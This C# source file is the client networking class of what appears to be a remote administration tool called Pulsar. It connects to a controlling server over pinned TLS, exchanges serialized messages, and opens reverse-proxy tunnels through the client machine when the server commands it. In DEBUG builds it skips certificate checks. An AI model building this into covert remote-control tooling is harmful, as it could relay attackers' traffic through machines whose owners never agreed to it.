using Pulsar.Client.ReverseProxy;
using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Common.Extensions;
using Pulsar.Common.Messages.Other;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Collections.Concurrent;
using Pulsar.Common.Messages.Administration.ReverseProxy;
using System.Diagnostics;
using System.IO;

namespace Pulsar.Client.Networking
{
    public class Client : ISender, IDisposable
    {
        /// <summary>
        /// Occurs as a result of an unrecoverable issue with the client.
        /// </summary>
        public event ClientFailEventHandler ClientFail;

        /// <summary>
        /// Represents a method that will handle failure of the client.
        /// </summary>
        /// <param name="s">The client that has failed.</param>
        /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
        public delegate void ClientFailEventHandler(Client s, Exception ex);

        /// <summary>
        /// Fires an event that informs subscribers that the client has failed.
        /// </summary>
        /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
        private void OnClientFail(Exception ex)
        {
            var handler = ClientFail;
            handler?.Invoke(this, ex);
        }

        /// <summary>
        /// Occurs when the state of the client has changed.
        /// </summary>
        public event ClientStateEventHandler ClientState;

        /// <summary>
        /// Represents the method that will handle a change in the client's state
        /// </summary>
        /// <param name="s">The client which changed its state.</param>
        /// <param name="connected">The new connection state of the client.</param>
        public delegate void ClientStateEventHandler(Client s, bool connected);

        /// <summary>
        /// Fires an event that informs subscribers that the state of the client has changed.
        /// </summary>
        /// <param name="connected">The new connection state of the client.</param>
        private void OnClientState(bool connected)
        {
            if (Connected == connected) return;

            Connected = connected;

            var handler = ClientState;
            handler?.Invoke(this, connected);
        }

        /// <summary>
        /// Occurs when a message is received from the server.
        /// </summary>
        public event ClientReadEventHandler ClientRead;

        /// <summary>
        /// Represents a method that will handle a message from the server.
        /// </summary>
        /// <param name="s">The client that has received the message.</param>
        /// <param name="message">The message that has been received by the server.</param>
        /// <param name="messageLength">The length of the message.</param>
        public delegate void ClientReadEventHandler(Client s, IMessage message, int messageLength);

        /// <summary>
        /// Fires an event that informs subscribers that a message has been received by the server.
        /// </summary>
        /// <param name="message">The message that has been received by the server.</param>
        /// <param name="messageLength">The length of the message.</param>
        private void OnClientRead(IMessage message, int messageLength)
        {
            Debug.WriteLine($"[CLIENT] Received packet: {message.GetType().Name} (Length: {messageLength} bytes)");
            var handler = ClientRead;
            handler?.Invoke(this, message, messageLength);
        }

        /// <summary>
        /// The keep-alive time in ms.
        /// </summary>
        public uint KEEP_ALIVE_TIME => 25000; // 25s

        /// <summary>
        /// The keep-alive interval in ms.
        /// </summary>
        public uint KEEP_ALIVE_INTERVAL => 25000; // 25s

        /// <summary>
        /// The header size in bytes.
        /// </summary>
        public int HEADER_SIZE => 4; // 4B

        /// <summary>
        /// Returns an array containing all of the proxy clients of this client.
        /// </summary>
        public ReverseProxyClient[] ProxyClients
        {
            get
            {
                lock (_proxyClientsLock)
                {
                    return _proxyClients.ToArray();
                }
            }
        }

        /// <summary>
        /// Gets if the client is currently connected to a server.
        /// </summary>
        public bool Connected { get; private set; }

        /// <summary>
        /// The stream used for communication.
        /// </summary>
        private SslStream _stream;

        /// <summary>
        /// The server certificate.
        /// </summary>
        private readonly X509Certificate2 _serverCertificate;

        /// <summary>
        /// A list of all the connected proxy clients that this client holds.
        /// </summary>
        private readonly List<ReverseProxyClient> _proxyClients = new List<ReverseProxyClient>();

        readonly object _readMessageLock = new object();
        readonly object _sendMessageLock = new object();
        readonly object _proxyClientsLock = new object();

        /// <summary>
        /// The buffer for the client's incoming payload.
        /// </summary>
        private byte[] _readBuffer;

        /// <summary>
        /// The queue which holds messages to send.
        /// </summary>
        private readonly ConcurrentQueue<IMessage> _sendBuffers = new ConcurrentQueue<IMessage>();

        /// <summary>
        /// Determines if the client is currently sending messages.
        /// </summary>
        private int _sendingMessagesFlag;

        // Receive info
        private int _readOffset;
        private int _readLength;

        /// <summary>
        /// Constructor of the client, initializes serializer types.
        /// </summary>
        /// <param name="serverCertificate">The server certificate.</param>
        protected Client(X509Certificate2 serverCertificate)
        {
            _serverCertificate = serverCertificate;
            _readBuffer = new byte[HEADER_SIZE];
            _readOffset = 0;
            _readLength = HEADER_SIZE;
        }

        /// <summary>
        /// Attempts to connect to the specified ip address on the specified port.
        /// </summary>
        /// <param name="ip">The ip address to connect to.</param>
        /// <param name="port">The port of the host.</param>
        protected void Connect(IPAddress ip, ushort port)
        {
            Socket handle = null;
            try
            {
                Disconnect();

                handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
                handle.Connect(ip, port);

                if (handle.Connected)
                {
                    _stream = new SslStream(new NetworkStream(handle, true), false, ValidateServerCertificate);
                    _stream.AuthenticateAsClient(ip.ToString(), null, SslProtocols.Tls12, false);
                    _stream.BeginRead(_readBuffer, _readOffset, _readBuffer.Length, AsyncReceive, null);
                    OnClientState(true);
                }
                else
                {
                    handle.Dispose();
                }
            }
            catch (Exception ex)
            {
                handle?.Dispose();
                OnClientFail(ex);
            }
        }

        /// <summary>
        /// Validates the server certificate by comparing it with the included server certificate.
        /// </summary>
        /// <param name="sender">The sender of the callback.</param>
        /// <param name="certificate">The server certificate to validate.</param>
        /// <param name="chain">The X.509 chain.</param>
        /// <param name="sslPolicyErrors">The SSL policy errors.</param>
        /// <returns>Returns <value>true</value> when the validation was successful, otherwise <value>false</value>.</returns>
        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            // for debugging don't validate server certificate
            return true;
#else
            // compare the received server certificate with the included server certificate to validate we are connected to the correct server
            return _serverCertificate.Equals(certificate);
#endif
        }

        private void AsyncReceive(IAsyncResult result)
        {
            try
            {
                if (_stream == null)
                {
                    return;
                }

                var bytesRead = _stream.EndRead(result);
                if (bytesRead <= 0)
                    throw new Exception("no bytes transferred");

                lock (_readMessageLock)
                {
                    _readOffset += bytesRead;
                    _readLength -= bytesRead;

                    if (_readLength == 0)
                    {
                        if (_readBuffer.Length == HEADER_SIZE)
                        {
                            var length = BitConverter.ToInt32(_readBuffer, 0);
                            if (length <= 0)
                                throw new InvalidDataException("Invalid message length.");

                            _readBuffer = new byte[length];
                            _readOffset = 0;
                            _readLength = length;
                        }
                        else
                        {
                            try
                            {
                                var message = PulsarMessagePackSerializer.Deserialize(_readBuffer);
                                OnClientRead(message, _readBuffer.Length);
                            }
                            finally
                            {
                                _readBuffer = new byte[HEADER_SIZE];
                                _readOffset = 0;
                                _readLength = HEADER_SIZE;
                            }
                        }
                    }

                }

                if (_stream != null)
                {
                    _stream.BeginRead(_readBuffer, _readOffset, _readLength, AsyncReceive, result.AsyncState);
                }
            }
            catch (Exception ex)
            {
                Disconnect();
                OnClientFail(ex);
            }
        }

        /// <summary>
        /// Sends a message to the connected server.
        /// </summary>
        /// <typeparam name="T">The type of the message.</typeparam>
        /// <param name="message">The message to be sent.</param>
        public void Send<T>(T message) where T : IMessage
        {
            if (!Connected || message == null)
                return;

            _sendBuffers.Enqueue(message);
            if (Interlocked.Exchange(ref _sendingMessagesFlag, 1) == 0)
            {
                ThreadPool.QueueUserWorkItem(ProcessSendBuffers);
            }
        }

        private void ProcessSendBuffers(object state)
        {
            while (true)
            {
                if (!Connected)
                {
                    SendCleanup(true);
                    return;
                }

                if (!_sendBuffers.TryDequeue(out var message))
                {
                    SendCleanup();
                    return;
                }

                SafeSendMessage(message);
            }
        }

        private void SendCleanup(bool clear = false)
        {
            Interlocked.Exchange(ref _sendingMessagesFlag, 0);
            if (clear)
            {
                while (_sendBuffers.TryDequeue(out _)) ;
            }
        }

        /// <summary>
        /// Sends a message to the connected server and blocks until sent.
        /// </summary>
        /// <typeparam name="T">The type of the message.</typeparam>
        /// <param name="message">The message to be sent.</param>
        public void SendBlocking<T>(T message) where T : IMessage
        {
            if (!Connected || message == null)
                return;

            SafeSendMessage(message);
        }

        /// <summary>
        /// Safely sends a message and prevents multiple simultaneous
        /// write operations on the <see cref="_stream"/>.
        /// </summary>
        /// <param name="message">The message to send.</param>
        private void SafeSendMessage(IMessage message)
        {
            SslStream localStream;
            lock (_sendMessageLock)
            {
                localStream = _stream;
            }

            if (localStream == null)
                return;

            try
            {
                var payload = PulsarMessagePackSerializer.Serialize(message);
                localStream.Write(BitConverter.GetBytes(payload.Length), 0, HEADER_SIZE);
                localStream.Write(payload, 0, payload.Length);
                localStream.Flush();
            }
            catch (Exception ex)
            {
                Disconnect();
                OnClientFail(ex);
            }
        }

        /// <summary>
        /// Disconnect the client from the server, disconnect all proxies that
        /// are held by this client, and dispose of other resources associated
        /// with this client.
        /// </summary>
        public void Disconnect()
        {
            if (_stream != null)
            {
                _stream.Dispose();
                _stream = null;
            }

            _readBuffer = new byte[HEADER_SIZE];
            _readOffset = 0;
            _readLength = HEADER_SIZE;

            if (_proxyClients != null)
            {
                lock (_proxyClientsLock)
                {
                    foreach (var proxy in _proxyClients)
                    {
                        try
                        {
                            proxy.Disconnect();
                        }
                        catch (Exception ex)
                        {
                            // Log or handle proxy disconnect exceptions
                            System.Diagnostics.Debug.WriteLine($"Proxy disconnect error: {ex.Message}");
                        }
                    }
                }
            }

            SendCleanup(true);
            OnClientState(false);
        }

        public void ConnectReverseProxy(ReverseProxyConnect command)
        {
            var proxy = new ReverseProxyClient(command, this);
            lock (_proxyClientsLock)
            {
                _proxyClients.Add(proxy);
            }
        }

        public ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
        {
            lock (_proxyClientsLock)
            {
                return _proxyClients.FirstOrDefault(proxy => proxy.ConnectionId == connectionId);
            }
        }

        public void RemoveProxyClient(int connectionId)
        {
            lock (_proxyClientsLock)
            {
                _proxyClients.RemoveAll(proxy => proxy.ConnectionId == connectionId);
            }
        }

        /// <summary>
        /// Implement IDisposable for managed resources.
        /// </summary>
        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                Disconnect();
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
    }
}
